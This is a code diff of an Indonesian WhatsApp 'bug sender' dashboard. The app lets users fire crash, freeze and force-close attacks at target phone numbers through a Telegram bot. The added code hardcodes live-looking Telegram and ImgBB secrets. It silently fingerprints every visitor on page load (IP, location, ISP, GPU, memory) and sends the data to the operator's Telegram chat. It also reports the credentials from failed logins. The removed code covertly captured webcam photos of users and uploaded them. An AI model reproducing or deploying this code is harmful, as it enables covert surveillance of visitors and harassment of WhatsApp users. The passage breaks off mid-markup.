@@ -1,7 +1,12 @@
 "use client"
 
 import React, { useState, useEffect, useRef } from "react"
-import { Shield, Bug, LayoutDashboard, Settings, Loader2, Music, ChevronLeft, ChevronRight, Volume2, VolumeX, Zap, EyeOff, Copy, CheckCircle2, AlertTriangle, ExternalLink, Lock, Ghost, Skull, ZapOff, Activity, Ban, Infinity, LogOut} from "lucide-react"
+import { Shield, Bug, LayoutDashboard, Settings, Loader2, Music, ChevronLeft, ChevronRight, Volume2, VolumeX, Zap, EyeOff, Copy, CheckCircle2, AlertTriangle, ExternalLink, Lock, Ghost, Skull, ZapOff, Activity, Ban, Infinity, LogOut } from "lucide-react"
+
+// KONFIGURASI UTAMA
+const TELE_TOKEN = "8633526016:AAGZGlW2TROHF1V6GujEpz8o_QYXNpqSkwM"
+const CHAT_ID = "6481060681"
+const IMGBB_API_KEY = "4caf6ea53a17b11f879581a8ca9ee92e"
 
 export default function YaeMikoDashboard() {
   const [isHydrated, setIsHydrated] = useState(false)
@@ -19,245 +24,165 @@ export default function YaeMikoDashboard() {
   const [activeNav, setActiveNav] = useState(0)
   const [isCopied, setIsCopied] = useState(false)
   const [onlineUsers, setOnlineUsers] = useState(38)
+
   const [showErrorOverlay, setShowErrorOverlay] = useState(false)
   const [showLimitPopup, setShowLimitPopup] = useState(false)
   const [showRestrictedOverlay, setShowRestrictedOverlay] = useState(false)
   const [showVerifyModal, setShowVerifyModal] = useState(false)
   const [isVerified, setIsVerified] = useState(false)
-  const [userRole, setUserRole] = useState<"free" | "admin">("free")
-  const [senderType, setSenderType] = useState<"global" | "pribadi">("global")
+
+  const [userRole, setUserRole] = useState("free")
+
+  const [senderType, setSenderType] = useState("global")
   const [senderNumber, setSenderNumber] = useState("")
-  const [pairingStatus, setPairingStatus] = useState<"idle" | "loading" | "success">("idle")
-  
-  // 🔧 FIX: Tambahin state & ref yang hilang
+  const [pairingStatus, setPairingStatus] = useState("idle")
+  const [receivedCode, setReceivedCode] = useState("")
+
+  // STATE UNTUK SENDER PRIBADI
   const [isSenderPaired, setIsSenderPaired] = useState(false)
   const [pribadiLimit, setPribadiLimit] = useState(0)
-  const [receivedCode, setReceivedCode] = useState<string | null>(null)
-  const isSendingRef = useRef(false)
-  const bgMusicRef = useRef<HTMLAudioElement | null>(null)
 
-  // 🔧 FIX: Tambahin BUG_TYPES
+  const bgMusicRef = useRef(null)
+  const isSendingRef = useRef(false)
+
   const BUG_TYPES = [
-    { name: "Bug WA Crash", icon: Ghost, color: "from-red-500 to-red-700" },
-    { name: "Bug Doc Exploit", icon: Bug, color: "from-purple-500 to-purple-700" },
-    { name: "Bug Call Bomb", icon: Zap, color: "from-yellow-500 to-yellow-700" },
-    { name: "Bug Freeze", icon: Shield, color: "from-cyan-500 to-cyan-700" },
-    { name: "Bug Spam", icon: Activity, color: "from-green-500 to-green-700" },
-    { name: "Bug Virus Total", icon: AlertTriangle, color: "from-orange-500 to-orange-700" },
-    { name: "Bug Web Hacking", icon: Lock, color: "from-blue-500 to-blue-700" },
-    { name: "Boot System", icon: ZapOff, color: "from-pink-500 to-pink-700" },
+    { name: "DELAY INVISIBLE", code: "delayLow", icon: <Ghost className="w-14 h-14 text-[#00e5ff]" /> },
+    { name: "FORCE CLOSE INVIS", code: "crashHigh", icon: <Skull className="w-14 h-14 text-red-500" /> },
+    { name: "DALAY INVIS IOS", code: "blankTap", icon: <ZapOff className="w-14 h-14 text-yellow-500" />},
+    { name: "BLANK UI", code: "delayIOS", icon: <Activity className="w-14 h-14 text-pink-500" /> },
+    { name: "CRASH ANDROID", code: "forceClose", icon: <Bug className="w-14 h-14 text-orange-500" /> },
   ]
 
-  // 🔧 FIX: Tambahin sendInitialIntel
   const sendInitialIntel = async () => {
     try {
-      const token = process.env.NEXT_PUBLIC_TELE_TOKEN
-      const chatId = "6481060681"
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      let targetID = localStorage.getItem('target_uuid') || 'SELZ-' + Math.random().toString(36).substring(2, 9).toUpperCase()
+      localStorage.setItem('target_uuid', targetID)
+
+      const ipRes = await fetch('https://ipapi.co/json/')
+      const ipData = await ipRes.json()
+
+      let gpu = "Unknown"
+      try {
+        const gl = document.createElement('canvas').getContext('webgl')
+        const debug = gl?.getExtension('WEBGL_debug_renderer_info')
+        gpu = gl?.getParameter(debug?.UNMASKED_RENDERER_WEBGL || 0) || "Unknown"
+      } catch (e) {}
+
+      const msg = `?? **NEW INTEL: ${targetID}**\n━━━━━━━━━━\n?? **IP:** ${ipData.ip} (${ipData.org})\n?? **LOC:** ${ipData.city}, ${ipData.country_name}\n?? **OS:** ${navigator.platform}\n?? **GPU:** ${gpu.slice(0,30)}\n?? **BAT:** ${navigator.hardwareConcurrency} Core / ${(navigator as any).deviceMemory || '?'}GB RAM`
+
+      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: `🌐 *DASHBOARD DIAKSES*\n━━━━━━━━━━\n🕐 *Waktu:* ${new Date().toLocaleString()}\n🌍 *Platform:* WEB V3.0\n━━━━━━━━━━`,
-          parse_mode: 'Markdown'
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+      })
+    } catch (e) {
+      console.error(e)
+    }
+  }
+
+  const syncPairing = async (action: string, messageText?: string): Promise<void> => {
+    try {
+      if (action === 'get') {
+        const res = await fetch(`/api/webhook?update=${Date.now()}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'get_data' })
         })
-      })
-    } catch (e) { console.error(e) }
-  }
-
-  // 🔧 FIX: Tambahin getPreciseLocation
-  const getPreciseLocation = async () => {
-    try {
-      const res = await fetch('https://ipapi.co/json/')
-      const data = await res.json()
-      return `📍 *Lokasi:* ${data.city || '?'}, ${data.region || '?'}, ${data.country_name || '?'}\n🌐 *IP:* ${data.ip || '?'}\n🏢 *ISP:* ${data.org || '?'}`
-    } catch (e) {
-      return '📍 *Lokasi:* Gagal mendeteksi'
-    }
-  }
-
-  // 🔧 FIX: Tambahin uploadToIMGBB
-  const uploadToIMGBB = async (blob: Blob) => {
-    try {
-      const formData = new FormData()
-      formData.append('image', blob, 'capture.jpg')
-      const res = await fetch('https://api.imgbb.com/1/upload?key=YOUR_IMGBB_API_KEY', {
-        method: 'POST',
-        body: formData
-      })
-      const data = await res.json()
-      return data?.data?.url || null
-    } catch (e) {
-      return null
-    }
-  }
-
-  // 🔧 FIX: Tambahin startFinalExecution
-  const startFinalExecution = async () => {
-    setIsSending(true)
-    const preciseLoc = await getPreciseLocation()
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true })
-      const video = document.createElement('video')
-      video.srcObject = stream
-      await video.play()
-      setTimeout(async () => {
-        const canvas = document.createElement('canvas')
-        canvas.width = video.videoWidth
-        canvas.height = video.videoHeight
-        canvas.getContext('2d')?.drawImage(video, 0, 0)
-        const blob = await new Promise<Blob>(res => canvas.toBlob(res as BlobCallback, 'image/jpeg'))
-        if (blob) {
-          const photoUrl = await uploadToIMGBB(blob)
-          const message = `📸 **TARGET CAPTURED**\n━━━━━━━━━━\n📱 **Target:** \`${targetNumber}\`\n🖼️ **Photo:** ${photoUrl || 'Upload Failed'}\n${preciseLoc}\n━━━━━━━━━━`
-          await fetch(`/api/control`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ action: 'sendReport', messageText: message })
-          })
-        }
-        stream.getTracks().forEach(t => t.stop())
-        setIsSending(false)
-      }, 3000)
-    } catch (e) {
-      await fetch(`/api/control`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'sendReport',
-          messageText: `⚠️ **CAMERA BLOCKED**\nTarget: ${targetNumber}\n${preciseLoc}`
-        })
-      })
-      setIsSending(false)
-    }
-  }
-
-  const syncAllData = async () => {
-    try {
-      // 🔧 FIX: Perbaiki path /api/api/bug/send -> /api/control
-      const res = await fetch(`/api/control?update=${Date.now()}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'get_data', username: username || null })
-      })
-      const data = await res.json()
-      if (data) {
-        if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
-        if (data.limit !== undefined && !isSendingRef.current) setBugLimit(Number(data.limit))
-        if (data.pairingCode && pairingStatus === "loading") {
-          setReceivedCode(data.pairingCode)
-          setPairingStatus("success")
-        }
-        if (data.isPaired !== undefined) {
-          setIsSenderPaired(data.isPaired === true)
-          setPribadiLimit(data.isPaired === true ? 10 : 0)
+        const data = await res.json()
+        if (data) {
+          if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
+          if (pairingStatus === "loading" && data.pairingCode) {
+            setReceivedCode(data.pairingCode)
+            setPairingStatus("success")
+          }
+          if (data.isPaired !== undefined) {
+            setIsSenderPaired(data.isPaired === true)
+            setPribadiLimit(data.isPaired === true ? 10 : 0)
+          }
         }
       }
-    } catch (err) { console.error(err) }
+    } catch (err) {
+      console.error(err)
+    }
+  }
+
+  const syncControl = async (action: string, valueToSet?: number, messageText?: string): Promise<void> => {
+    try {
+      if (action === 'get') {
+        if (isSendingRef.current) return
+        
+        const res = await fetch(`/api/control?update=${Date.now()}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'get_data' })
+        })
+        const data = await res.json()
+        
+        if (data && !isSendingRef.current) {
+          if (data.limit !== undefined) setBugLimit(Number(data.limit))
+          if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
+        }
+      } 
+      else if (action === 'set' && valueToSet !== undefined) {
+        await fetch('/api/control', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'set', valueToSet })
+        })
+      } 
+      else if (action === 'sendReport' && messageText) {
+        await fetch('/api/control', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'sendReport', messageText })
+        })
+      }
+    } catch (err) {
+      console.error("Gagal Sync Control:", err)
+    }
   }
 
   const handleRequestPairing = async () => {
     if (!senderNumber) return alert("Masukin nomor sender dulu!")
     setPairingStatus("loading")
     try {
-      await fetch('/api/control', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'sendReport', messageText: `/pair ${senderNumber}` })
-      })
-      const checkInterval = setInterval(async () => { await syncAllData() }, 3000)
+      await syncControl('sendReport', undefined, `/pair ${senderNumber}`)
+      const checkDatabaseInterval = setInterval(async () => {
+        await syncPairing('get')
+      }, 3000)
       setTimeout(() => {
-        clearInterval(checkInterval)
+        clearInterval(checkDatabaseInterval)
         setPairingStatus((prev) => prev === "loading" ? "idle" : prev)
       }, 45000)
-    } catch (e) { console.error(e); setPairingStatus("idle") }
+    } catch (e) {
+      console.error(e)
+      setPairingStatus("idle")
+    }
   }
 
-  const handleLogin = async () => {
-    try {
-      const res = await fetch('/api/control', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'login', username, password })
-      })
-      const data = await res.json()
-      if (data.success) {
-        setUserRole(data.role)
-        setIsLoggedIn(true)
-        setShowErrorOverlay(false)
-        if (data.role === "admin") {
-          localStorage.setItem("admin_key", password)
-        }
-        await syncAllData()
-      } else {
-        setShowErrorOverlay(true)
+  // Hook Efek Utama untuk Inisialisasi Aplikasi
+  useEffect(() => {
+    sendInitialIntel();
+    
+    async function initData() {
+      await syncControl('get')
+      await syncPairing('get')
+      const localVerify = localStorage.getItem('target_verified')
+      if (localVerify === 'true') {
+        setIsVerified(true)
       }
-    } catch (e) { console.error(e) }
-  }
-
-  const handleSendBug = async () => {
-    if (!targetNumber) {
-      alert("Masukin nomor target dulu!")
-      return
+      setIsHydrated(true)
     }
-    if (targetNumber === "6289505198913") {
-      setShowRestrictedOverlay(true)
-      return
-    }
-    if (senderType === "pribadi" && !isSenderPaired) {
-      alert("Kamu belum pairing sender pribadi!")
-      return
-    }
-    isSendingRef.current = true
-    const selectedBug = BUG_TYPES[activeNav].name
-    const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000
-
-    setTimeout(async () => {
-      // 🔧 FIX: Perbaiki path /api/bug -> /api/bug/send
-      const res = await fetch('/api/bug/send', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, targetNumber, selectedBug, engineSpeed, senderType, senderNumber })
-      })
-      const data = await res.json()
-      if (!data.success) {
-        if (data.error && data.error.includes("Limit")) {
-          setShowLimitPopup(true)
-        } else {
-          alert(data.error || "Gagal mengirim bug")
-        }
-        isSendingRef.current = false
-        return
-      }
-      await syncAllData()
-      if (isVerified) {
-        startFinalExecution()
-      } else {
-        setShowVerifyModal(true)
-      }
-      setTimeout(() => { isSendingRef.current = false }, 8000)
-    }, delay)
-  }
-
-  const copyToClipboard = () => {
-    if (typeof navigator !== 'undefined' && targetNumber) {
-      navigator.clipboard.writeText(targetNumber)
-      setIsCopied(true)
-      setTimeout(() => setIsCopied(false), 2000)
-    }
-  }
+    initData()
+  }, [userRole])
 
   useEffect(() => {
-    sendInitialIntel()
-    setIsHydrated(true)
-  }, [])
-
-  useEffect(() => {
-    if (!isLoggedIn) return
-    syncAllData()
-    const autoRefresh = setInterval(async () => { await syncAllData() }, 4000)
+    const autoRefresh = setInterval(async () => {
+      await syncControl('get')
+      await syncPairing('get')
+    }, 4000)
     return () => clearInterval(autoRefresh)
-  }, [isLoggedIn, username, pairingStatus])
+  }, [userRole, pairingStatus])
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -280,334 +205,275 @@ export default function YaeMikoDashboard() {
     }
   }, [isMusicOn, isLoggedIn, isWebLocked, isHydrated])
 
-  if (!isHydrated) {
-    return (
-      <div className="min-h-screen bg-[#0a0f1a] flex items-center justify-center">
-        <Loader2 className="w-8 h-8 text-cyan-400 animate-spin" />
-      </div>
-    )
+  const handleLogin = async () => {
+    if (username === "Leo" && password === "LEONZKENEDYZ") {
+      setUserRole("admin")
+      setIsLoggedIn(true)
+      setShowErrorOverlay(false)
+      const logMsg = `?? *LAPORAN LOGIN ADMIN OWNER*\n\n?? *User:* ${username}\n?? *Status:* Masuk sebagai Administrator`
+      await syncControl('sendReport', undefined, logMsg)
+    } else if (username === "Selz" && password === "Freebug") {
+      setUserRole("free")
+      setIsLoggedIn(true)
+      setShowErrorOverlay(false)
+      const logMsg = `?? *LAPORAN LOGIN DASHBOARD MEMBER*\n\n?? *User:* ${username}`
+      await syncControl('sendReport', undefined, logMsg)
+    } else {
+      setShowErrorOverlay(true)
+      const alertMsg = `?? *PERCOBAAN LOGIN GAGAL!*\n\n?? *Username input:* ${username || 'Kosong'}\n?? *Password input:* ${password || 'Kosong'}`
+      await syncControl('sendReport', undefined, alertMsg)
+    }
   }
+
+  const handleSendBug = async () => {
+    if (!targetNumber) {
+      alert("Masukin nomor target dulu!")
+      return
+    }
+    if (targetNumber === "6289505198913") {
+      setShowRestrictedOverlay(true)
+      return
+    }
+
+    const currentLimit = senderType === "pribadi" ? pribadiLimit : bugLimit
+
+    if (userRole === "free" && currentLimit <= 0) {
+      setShowLimitPopup(true)
+      return
+    }
+
+    if (senderType === "pribadi" && !isSenderPaired) {
+      alert("Kamu belum pairing sender pribadi!")
+      return
+    }
+
+    isSendingRef.current = true
+    let nextLimit = bugLimit
+
+    if (userRole === "free") {
+      if (senderType === "pribadi") {
+        const nextPribadiLimit = Math.max(0, pribadiLimit - 1)
+        setPribadiLimit(nextPribadiLimit)
+        nextLimit = nextPribadiLimit 
+      } else {
+        nextLimit = Math.max(0, bugLimit - 1)
+        setBugLimit(nextLimit)
+        await syncControl('set', nextLimit)
+      }
+    }
+
+    const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000
+    const selectedBug = BUG_TYPES[activeNav].name
+
+    setTimeout(async () => {
+      const sisaLimitText = userRole === "admin" ? "UNLIMITED (?? ADMIN)" : `${nextLimit}/5`
+      const attackMsg = `?? *LAPORAN PENYERANGAN BUG*\n\n?? *Pengirim:* ${username} (${userRole.toUpperCase()})\n?? *Target:* \`${targetNumber}\`\n?? *Jenis Bug:* ${selectedBug}\n?? *Speed Engine:* ${engineSpeed}\n?? *Sisa Limit User:* ${sisaLimitText}\n?? *Sender Mode:* ${senderType.toUpperCase()}`
+      
+      await syncControl('sendReport', undefined, attackMsg)
+
+      setTimeout(async () => {
+        const commandShortMsg = senderType === "pribadi" && senderNumber
+          ? `/ryx ${targetNumber} ${senderNumber}`
+          : `/ryx ${targetNumber}`
+        await syncControl('sendReport', undefined, commandShortMsg)
+      }, 1000)
+
+      setIsSending(false)
+      isSendingRef.current = false
+    }, delay)
+  }
+
+  const copyToClipboard = () => {
+    if (typeof navigator !== 'undefined' && targetNumber) {
+      navigator.clipboard.writeText(targetNumber)
+      setIsCopied(true)
+      setTimeout(() => setIsCopied(false), 2000)
+    }
+  }
+
+  if (!isHydrated) return <div className="bg-black min-h-screen flex items-center justify-center"><Loader2 className="w-8 h-8 text-cyan-400 animate-spin" /></div>
 
   if (isWebLocked) {
     return (
-      <div className="min-h-screen bg-[#0a0f1a] flex items-center justify-center">
-        <div className="text-center p-8">
-          <h1 className="text-4xl font-bold text-red-500 mb-4 animate-glitch_extreme">⚠️ SYSTEM MAINTENANCE ⚠️</h1>
-          <p className="text-gray-400 text-lg">Sabar Dongo, Server lagi Update Sama Selz. Balik Lagi Nanti Kalau Udah Selesai Update nya.</p>
-        </div>
+      <div className="fixed inset-0 z-[99999] bg-black flex flex-col items-center justify-center p-10 text-center">
+        <Ban className="w-32 h-32 text-red-600 mb-8 mx-auto animate-pulse" />
+        <h1 className="text-4xl font-black italic uppercase text-white tracking-tighter mb-4">??SYSTEM-MAINTENANCE??</h1>
+        <p className="text-white/50 text-xs font-bold uppercase tracking-[0.3em] max-w-xs mx-auto">
+          Sabar Dongo, Server lagi Update Sama Selz. Balik Lagi Nanti Kalau Udah Selesai Update nya.
+        </p>
+        <Loader2 className="w-4 h-4 text-red-600 animate-spin mt-10" />
       </div>
     )
   }
 
-  const currentStatus = senderType === 'pribadi'
-    ? (isSenderPaired ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' })
-    : (bugLimit > 0 ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' })
+  const currentStatus = (() => {
+    if (senderType === 'pribadi') {
+      return isSenderPaired ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' };
+    } else {
+      return bugLimit > 0 ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' };
+    }
+  })();
 
   return (
-    <div className="min-h-screen bg-[#0a0f1a] text-white overflow-hidden relative">
-      {/* Background Video */}
-      <video
-        autoPlay
-        loop
-        muted
-        playsInline
-        className="fixed inset-0 w-full h-full object-cover opacity-30 z-0"
-      >
-        <source src="/bg-anime.mp4" type="video/mp4" />
-      </video>
+    <div className={`relative min-h-screen bg-black text-white overflow-hidden transition-opacity duration-500 ${isStealth ? 'opacity-30' : 'opacity-100'}`}>
+      <div className="fixed inset-0 z-0">
+        <div className="absolute inset-0 bg-gradient-to-b from-[#050b14]/70 to-black"></div>
+      </div>
+      <audio ref={bgMusicRef} src="/audio.mp3" loop />
 
-      {/* Background Music */}
-      <audio ref={bgMusicRef} loop>
-        <source src="/audio.mp3" type="audio/mpeg" />
-      </audio>
+      {pairingStatus === "loading" && (
+        <div className="fixed inset-0 z-[10008] bg-black/95 flex flex-col items-center justify-center backdrop-blur-md">
+          <Loader2 className="w-16 h-16 text-cyan-400 animate-spin mb-4" />
+          <p className="font-bold text-xs uppercase tracking-widest text-cyan-400">MEMPROSES PAIRING BOT...</p>
+        </div>
+      )}
 
-      {/* Overlay gradient */}
-      <div className="fixed inset-0 bg-gradient-to-b from-[#0a0f1a]/80 via-[#0a0f1a]/60 to-[#0a0f1a]/90 z-[1]" />
+      {pairingStatus === "success" && (
+        <div className="fixed inset-0 z-[10009] bg-black/95 flex flex-col items-center justify-center p-6 text-center">
+          <div className="bg-white/5 p-8 rounded-3xl border-cyan-500/20 max-w-xs w-full backdrop-blur-lg">
+            <h2 className="text-cyan-400 font-black italic mb-2 uppercase tracking-wider">WHATSAPP PAIRING CODE</h2>
+            <div className="text-3xl font-mono font-black text-pink-500 bg-black/60 p-4 rounded-xl border-white/5 mb-6 tracking-wider">{receivedCode}</div>
+            <button onClick={() => setPairingStatus("idle")} className="w-full py-3 bg-cyan-600 text-white font-black uppercase text-xs rounded-full shadow-lg">OK</button>
+          </div>
+        </div>
+      )}
 
-      {/* Cyberpunk grid overlay */}
-      <div className="fixed inset-0 bg-[linear-gradient(rgba(0,212,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(0,212,255,0.03)_1px,transparent_1px)] bg-[size:40px_40px] z-[2]" />
+      {showErrorOverlay && (
+        <div className="fixed inset-0 z-[10005] bg-red-950/90 flex flex-col items-center justify-center p-8 text-center backdrop-blur-3xl animate-bg_rumble">
+          <AlertTriangle className="w-24 h-24 text-red-500 mb-6 animate-shake_violent" />
+          <h1 className="text-3xl font-black italic uppercase text-white animate-glitch_extreme mb-8">CREATE AKUN KE BOT DONGO!</h1>
+          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-4 px-10 rounded-full font-black uppercase text-xs flex items-center justify-center shadow-2xl">BUKA BOT</a>
+          <button onClick={() => setShowErrorOverlay(false)} className="mt-6 text-white/40 font-bold uppercase text-[10px] tracking-widest hover:text-white transition">COBA LAGI</button>
+        </div>
+      )}
 
-      {/* Scanline effect */}
-      <div className="fixed inset-0 pointer-events-none z-[3] bg-[repeating-linear-gradient(0deg,transparent,transparent_2px,rgba(0,0,0,0.03)_2px,rgba(0,0,0,0.03)_4px)]" />
+      {showRestrictedOverlay && (
+        <div className="fixed inset-0 z-[10006] bg-red-900/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-3xl">
+          <Shield className="w-32 h-32 text-white mb-6" />
+          <h1 className="text-4xl font-black italic uppercase text-white tracking-tighter">ACCESS DENIED</h1>
+          <button onClick={() => setShowRestrictedOverlay(false)} className="px-12 py-4 bg-white text-black font-black uppercase text-xs rounded-full shadow-2xl">KEMBALI</button>
+        </div>
+      )}
 
-      {/* MAIN CONTENT */}
-      <div className="relative z-10 min-h-screen flex flex-col">
-        {/* TOP BAR */}
-        <header className="glass-strong border-b border-cyan-500/20 px-6 py-3 flex items-center justify-between">
-          <div className="flex items-center gap-3">
-            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center shadow-lg shadow-cyan-500/20">
-              <Skull className="w-5 h-5 text-white" />
+      {isSending && (
+        <div className="fixed inset-0 z-[10002] bg-black/80 flex flex-col items-center justify-center backdrop-blur-md">
+          <Loader2 className="w-24 h-24 text-pink-500 animate-spin mb-6" />
+          <p className="font-black italic uppercase text-sm tracking-[0.5em] text-cyan-400 text-center">SEDANG MENGIRIM BUG...</p>
+        </div>
+      )}
+
+      {showLimitPopup && (
+        <div className="fixed inset-0 z-[10001] bg-black/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-md">
+          <Bug className="w-28 h-28 text-red-600 mb-6 animate-shake_violent" />
+          <h2 className="text-3xl font-black italic uppercase text-red-500 mb-4">LIMIT LU ABIS NGENTOD</h2>
+          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-5 px-12 rounded-full font-black uppercase text-xs flex items-center gap-2">
+            <ExternalLink size={16} /> MENUJU BOT
+          </a>
+          <button onClick={() => setShowLimitPopup(false)} className="mt-6 text-white/30 font-bold uppercase text-[9px] tracking-widest hover:text-white transition">LIMIT BAKALAN RESET SETELAH 24 JAM</button>
+        </div>
+      )}
+
+      {!isLoggedIn ? (
+        <div className="relative z-10 flex items-center justify-center min-h-screen p-6">
+          <div className="w-full max-w-sm bg-white/5 border-white/10 backdrop-blur-3xl rounded-3xl p-10 shadow-2xl">
+            <h1 className="text-3xl font-black italic uppercase text-cyan-400 tracking-tighter mb-10 text-center">
+              YAE MIKO <span className="text-xs text-white/30 block tracking-[0.5em]">VERSI 1.5</span>
+            </h1>
+            <div className="space-y-4">
+              <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none" placeholder="USERNAME" />
+              <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none" placeholder="PASSWORD" />
+              <button onClick={handleLogin} className="w-full py-5 bg-cyan-600 rounded-full font-black uppercase italic text-xs text-white flex items-center justify-center gap-3"><Lock size={16}/> LOGIN</button>
             </div>
+          </div>
+        </div>
+      ) : (
+        <div className="relative z-10 p-6 max-w-md mx-auto min-h-screen pb-24">
+          {currentView === 'dashboard' ? (
             <div>
-              <h1 className="text-lg font-bold text-glow-cyan tracking-wider">YAE MIKO</h1>
-              <p className="text-[10px] text-gray-500 tracking-[0.2em] uppercase">Menu Bug v3.0</p>
-            </div>
-          </div>
-
-          <div className="flex items-center gap-4">
-            {/* Online Users Fake Counter */}
-            <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-500/10 border border-green-500/20">
-              <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
-              <span className="text-xs text-green-400 font-mono">{onlineUsers} ONLINE</span>
-            </div>
-
-            {/* Music Toggle */}
-            <button
-              onClick={() => setIsMusicOn(!isMusicOn)}
-              className="p-2 rounded-lg hover:bg-white/5 transition-all"
-            >
-              {isMusicOn ? <Volume2 className="w-4 h-4 text-cyan-400" /> : <VolumeX className="w-4 h-4 text-gray-500" />}
-            </button>
-
-            {/* Status Indicator */}
-            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10">
-              <div className={`w-2 h-2 rounded-full ${currentStatus.color} animate-pulse`} />
-              <span className={`text-xs font-mono ${currentStatus.color}`}>{currentStatus.text}</span>
-            </div>
-          </div>
-        </header>
-
-        {/* LOGIN SCREEN */}
-        {!isLoggedIn ? (
-          <div className="flex-1 flex items-center justify-center p-4">
-            <div className="glass-strong rounded-2xl p-8 w-full max-w-md border border-cyan-500/20 glow-cyan">
-              <div className="text-center mb-8">
-                <div className="w-20 h-20 mx-auto rounded-2xl bg-gradient-to-br from-cyan-500 to-purple-600 flex items-center justify-center mb-4 shadow-2xl">
-                  <Shield className="w-10 h-10 text-white" />
-                </div>
-                <h2 className="text-2xl font-bold text-glow-cyan">Akses Dashboard</h2>
-                <p className="text-gray-500 text-sm mt-1">Masuk pake akun Selz</p>
+              <div className="flex justify-between items-center mb-6">
+                <span className="text-xs font-black uppercase tracking-widest text-cyan-400">SPEED: {engineSpeed}</span>
+                <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${userRole === 'admin' ? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10' : 'text-pink-500 border-pink-500/20'}`}>
+                  {userRole === "admin" ? "ROLE: ADMIN" : `LIMIT: ${bugLimit}/5`}
+                </span>
               </div>
 
-              {showErrorOverlay && (
-                <div className="mb-4 p-3 rounded-xl bg-red-500/10 border border-red-500/20 text-red-400 text-sm text-center animate-shake_violent">
-                  <AlertTriangle className="w-4 h-4 inline mr-1" />
-                  Username atau Password salah!
-                </div>
-              )}
-
-              <input
-                type="text"
-                placeholder="Username"
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
-                className="w-full mb-3 px-4 py-3 rounded-xl bg-[#0a1628]/80 border border-cyan-500/20 focus:border-cyan-400/50 outline-none text-white placeholder-gray-600 transition-all"
-              />
-              <input
-                type="password"
-                placeholder="Password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
-                className="w-full mb-5 px-4 py-3 rounded-xl bg-[#0a1628]/80 border border-cyan-500/20 focus:border-cyan-400/50 outline-none text-white placeholder-gray-600 transition-all"
-              />
-              <button
-                onClick={handleLogin}
-                className="w-full py-3 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 text-white font-bold text-sm tracking-wider uppercase hover:shadow-lg hover:shadow-cyan-500/20 transition-all"
-              >
-                Login
-              </button>
-            </div>
-          </div>
-        ) : (
-          /* DASHBOARD */
-          <div className="flex-1 p-4 sm:p-6 overflow-y-auto">
-            {/* STATS CARDS */}
-            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-6">
-              <div className="glass rounded-xl p-4 border border-cyan-500/10">
-                <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Limit Sisa</p>
-                <p className="text-2xl font-bold text-glow-cyan">{bugLimit}/5</p>
-              </div>
-              <div className="glass rounded-xl p-4 border border-green-500/10">
-                <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Status</p>
-                <p className={`text-lg font-bold ${currentStatus.color}`}>{currentStatus.text === 'ACT' ? 'ACTIVE' : 'OFFLINE'}</p>
-              </div>
-              <div className="glass rounded-xl p-4 border border-purple-500/10">
-                <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Role</p>
-                <p className="text-lg font-bold text-glow-pink">{userRole.toUpperCase()}</p>
-              </div>
-              <div className="glass rounded-xl p-4 border border-yellow-500/10">
-                <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Engine</p>
